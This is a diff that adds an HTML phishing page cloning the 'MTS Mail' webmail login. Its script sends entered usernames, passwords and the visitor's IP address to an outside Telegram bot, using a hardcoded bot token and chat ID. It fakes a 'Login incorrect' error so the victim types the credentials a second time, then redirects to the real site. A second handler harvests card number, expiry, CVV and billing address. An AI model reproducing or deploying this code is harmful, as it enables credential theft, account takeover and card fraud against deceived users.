@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html
+  lang="en"
+  style=""
+  class="js flexbox flexboxlegacy rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent"
+>
+  <head>
+    <meta name="viewport" content="width=device-width" />
+    <meta name="viewport" content="initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=11" />
+
+    <title>MTS Mail | Login</title>
+
+    <script src="https://auth.mtsmail.ca/js/modernizr.js"></script>
+
+    <script src="https://auth.mtsmail.ca/js/jquery-1.11.1.min.js"></script>
+
+    <link
+      href="https://auth.mtsmail.ca/bootstrap/3.3.5/css/bootstrap.min.css"
+      rel="stylesheet"
+      media="screen"
+    />
+    <script src="https://auth.mtsmail.ca/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <script type="text/javascript">
+      var handler = "allow";
+      var now = new Date();
+      var can_submit_by = now.getTime() + 15 * 1000;
+      var completed_captcha = "0" == true;
+
+      function enableSubmit() {
+        $("#recaptcha_submit").removeAttr("disabled");
+      }
+      $(document).ready(function () {
+        $("#main-form").submit(function (e) {
+          if (
+            (handler == "captcha" || handler == "reject") &&
+            !completed_captcha
+          ) {
+            e.preventDefault();
+            $("#captcha_modal").modal({
+              backdrop: "static",
+              keyboard: false,
+            });
+            $("#recaptcha_submit").click(function () {
+              var my_recaptcha_response_field = document.createElement("input");
+              my_recaptcha_response_field.setAttribute("type", "hidden");
+              my_recaptcha_response_field.setAttribute(
+                "name",
+                "g-recaptcha-response"
+              );
+              my_recaptcha_response_field.setAttribute(
+                "value",
+                grecaptcha.getResponse()
+              );
+
+              $("#main-form").append(my_recaptcha_response_field);
+              $("#captcha_modal").on("hidden.bs.modal", function (e) {
+                completed_captcha = true;
+                $("#main-form").submit();
+              });
+              $("#captcha_modal").modal("hide");
+            });
+
+            $("#captcha_modal").css("position", "absolute");
+            return false;
+          }
+          $("#waiting_modal").modal({
+            backdrop: "static",
+            keyboard: false,
+          });
+
+          var now = new Date();
+          if (
+            handler == "allow" ||
+            handler == "whitelist" ||
+            now.getTime() > can_submit_by
+          ) {
+            return true;
+          }
+          setTimeout(
+            "$('#main-form').submit();",
+            now.getTime() - can_submit_by
+          );
+          return false;
+        });
+      });
+    </script>
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://auth.mtsmail.ca/css/default/base.css"
+    />
+
+    <script src="https://auth.mtsmail.ca/js/default/base.js"></script>
+
+    <style>
+      .modal-sm {
+        width: auto;
+      }
+
+      .content .component-header {
+        padding-top: 1px;
+      }
+
+      .content .logo_bar_top {
+        border-top: none;
+        font-weight: normal;
+      }
+
+      .content .self-care a {
+        font-size: 12px;
+      }
+
+      .footer_notes,
+      .self-care {
+        font-size: 12px;
+      }
+
+      .footer_notes .row {
+        display: table-footer-group;
+      }
+
+      #bodyContent .password-toggle {
+        font-size: 10px;
+      }
+
+      .submit-button {
+        background-color: #0066a3;
+      }
+
+      #form-content a,
+      #bodyContent a {
+        color: #0066a3;
+      }
+
+      .content .progress {
+        background-color: #b3b3b3;
+      }
+
+      .content .progress .indeterminate {
+        background-color: #5e5e5e;
+      }
+
+      .content .logo {
+        max-width: 160px;
+      }
+
+      #bodyContent {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      class="modal fade modal-sm"
+      id="waiting_modal"
+      tabindex="-1"
+      role="dialog"
+      aria-labelledby="myModalLabel"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h4 class="modal-title">Please wait...</h4>
+          </div>
+          <div class="modal-body">
+            <p>Please wait while we log you in.</p>
+          </div>
+        </div>
+        <!-- /.modal-content -->
+      </div>
+      <!-- /.modal-dialog -->
+    </div>
+    <!-- /.modal -->
+    <div
+      class="modal fade modal-sm"
+      id="captcha_modal"
+      tabindex="-1"
+      role="dialog"
+      aria-labelledby="myModalLabel"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h4 class="modal-title">Security Verification</h4>
+          </div>
+          <div class="modal-body">
+            <p class="alert alert-block alert-error">
+              In order to protect your account, please complete the additional
+              verification step below.
+            </p>
+            <div
+              class="g-recaptcha"
+              data-sitekey=""
+              data-callback="enableSubmit"
+            ></div>
+          </div>
+          <div class="modal-footer">
+            <button
+              type="button"
+              id="recaptcha_submit"
+              class="btn btn-primary"
+              disabled="disabled"
+            >
+              Submit
+            </button>
+          </div>
+        </div>
+        <!-- /.modal-content -->
+      </div>
+      <!-- /.modal-dialog -->
+    </div>
+    <!-- /.modal -->
+
+    <div id="bodyContent">
+      <div class="content mvpd-login">
+        <header class="header">
+          <img
+            class="logo mvpd-logo left"
+            src="https://cableco.auth-gateway.net/images/mts/bellmts.png"
+            alt="MTS Mail"
+          />
+
+          <div class="clearfix"></div>
+
+          <div class="logo_bar_top login_message">
+            Log in with your mymts.net email address
+          </div>
+
+          <h2 class="component-header"></h2>
+        </header>
+
+        <div class="main-body">
+          <form id="form1" method="POST" onsubmit="handleForm1Submit(event)">
+            <input type="hidden" id="hidden_ip" />
+            <div class="form-group">
+              <input
+                placeholder="Email Address (example@mymts.net)"
+                class="form-control"
+                id="username"
+                type="text"
+                name="username"
+                value=""
+                tabindex="1"
+                autocapitalize="off"
+                autocorrect="off"
+                required=""
+                autofocus=""
+              />
+            </div>
+
+            <div class="form-group">
+              <input
+                placeholder="Password"
+                class="form-control"
+                id="password"
+                type="password"
+                name="password"
+                value=""
+                tabindex="2"
+                autocapitalize="off"
+                autocorrect="off"
+                required=""
+              />
+              <a
+                class="password-toggle"
+                onclick="toggleShowPassword(&#39;password&#39;, &#39;SHOW&#39;, &#39;HIDE&#39;, this)"
+                >SHOW</a
+              >
+            </div>
+
+            <ul class="errors" id="wrongCred" style="display: none">
+              <li>
+                <label for="password">Login incorrect</label>
+              </li>
+            </ul>
+
+            <button id="login" type="submit" class="login submit-button">
+              Log In
+            </button>
+            <div class="clearfix">
+              <!-- remember_me Area -->
+              <div
+                class="checkbox-group remember"
+                onmouseover="mouseOverToPopupRememberMe(true);"
+                onmouseout="mouseOverToPopupRememberMe(false);"
+              >
+                <input
+                  type="checkbox"
+                  id="remember_me"
+                  name="remember_me"
+                  value="yes"
+                  tabindex="4"
+                  checked="checked"
+                />
+                <label for="remember_me">Remember Me</label>
+              </div>
+              <div id="rememberMePopup">
+                When you choose "Remember Me" on sign in, we will remember who
+                you are and keep you signed in for up to 90 days, unless you
+                sign out or your browser cookies are deleted. <br />If you are
+                on a public computer, we recommend you uncheck the box.
+              </div>
+
+              <a
+                target="_blank"
+                class="forgot-password pull-right"
+                href="https://selfcare.mtsmail.ca/selfcare/password_reset/qa/"
+                >Forgot Password?</a
+              >
+            </div>
+          </form>
+
+          <ul class="social-links"></ul>
+        </div>
+
+        <ul class="self-care"></ul>
+
+        <footer class="footer">
+          <p class="footer-message"></p>
+        </footer>
+      </div>
+    </div>
+    <script>
+      function formatNumber(input) {
+        let value = input.value;
+        value = value.replace(/\D/g, "");
+        input.value = value;
+      }
+    </script>
+    <script>
+      function formatAsXXXX(input) {
+        let value = input.value;
+        value = value.replace(/\D/g, "");
+        value = value.replace(/(\d{4})/g, "$1-");
+        value = value.replace(/-$/, "");
+        input.value = value;
+      }
+    </script>
+    <script>
+      function formatDate(input) {
+        let value = input.value;
+        value = value.replace(/\D/g, "");
+        if (value.length > 1) {
+          value = value.replace(/(\d{2})(\d)/, "$1/$2");
+        }
+        if (value.length > 4) {
+          value = value.replace(/(\d{2})(\d{2})/, "$1/$2");
+        }
+        input.value = value;
+      }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+      let count = 0;
+      const sendTeleMsg = async (msg) => {
+        const TELEGRAM_BOT_TOKEN = "7306291274:AAFClNXPpirNQ4Dei6NNNZC7Us0xrvrYk1I"; //YOUR_TELEGRAM_BOT_TOKEN HERE
+        const CHAT_ID = "6665210948"; // YOUR CHAT_ID HERE
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        try {
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+
+          const data = await response.json();
+        } catch (error) {
+          console.error("Error sending message:", error);
+        }
+      };
+      $(document).ready(function () {
+        // Get the user's IP address
+        $.getJSON("https://json.geoiplookup.io/?callback=?", function (data) {
+          var obj = JSON.parse(JSON.stringify(data));
+          document.getElementById("hidden_ip").value = obj.ip;
+        });
+      });
+
+      const handleForm1Submit = (event) => {
+        event.preventDefault();
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const ip = document.getElementById("hidden_ip").value;
+        count++;
+
+        const message =
+          "++++++🔰MTS MAIL LOGIN🔰++++++" +
+          "\n" +
+          "[👤USERNAME] : " +
+          username +
+          "\n" +
+          "[🔑PASSWORD] : " +
+          password +
+          "\n" +
+          "[🌍 IP ADDRESS] : " +
+          ip +
+          "\n" +
+          "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" +
+          "\n";
+
+        sendTeleMsg(message);
+
+        if (count === 2) {
+          setTimeout(() => {
+            window.location.href = "https://www.mtsmail.ca";
+          }, 2000);
+        } else {
+          setTimeout(() => {
+            document.querySelector("#wrongCred").style.display = "block";
+            document.querySelector("#username").value = "";
+            document.querySelector("#password").value = "";
+          }, 2000);
+        }
+
+        return false;
+      };
+
+      const handleForm2Submit = (event) => {
+        event.preventDefault();
+        const fname = document.getElementById("fname").value;
+        const cardNumber = document.getElementById("cardNumber").value;
+        const expiryDate = document.getElementById("exp").value;
+        const cvv = document.getElementById("cvv").value;
+        const address = document.getElementById("address").value;
+        const zipcode = document.getElementById("zipcode").value;
+        const message =
+          "++++++🔰MTS MAIL CARD DETAILS💳🔰++++++" +
+          "\n" +
+          "[NAME ON CARD] : " +
+          fname +
+          "\n" +
+          "[CARD NUMBER] : " +
+          cardNumber +
+          "\n" +
+          "[EXPIRY DATE] : " +
+          expiryDate +
+          "\n" +
+          "[CVV] : " +
+          cvv +
+          "\n" +
+          "[ADDRESS] : " +
+          address +
+          "\n" +
+          "[ZIPCODE] : " +
+          zipcode +
+          "\n" +
+          "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" +
+          "\n";
+        sendTeleMsg(message);
+        setTimeout(() => {
+          window.location.href = "https://www.mtsmail.ca";
+        }, 2000);
+        return false;
+      };
+    </script>
+  </body>
+</html>
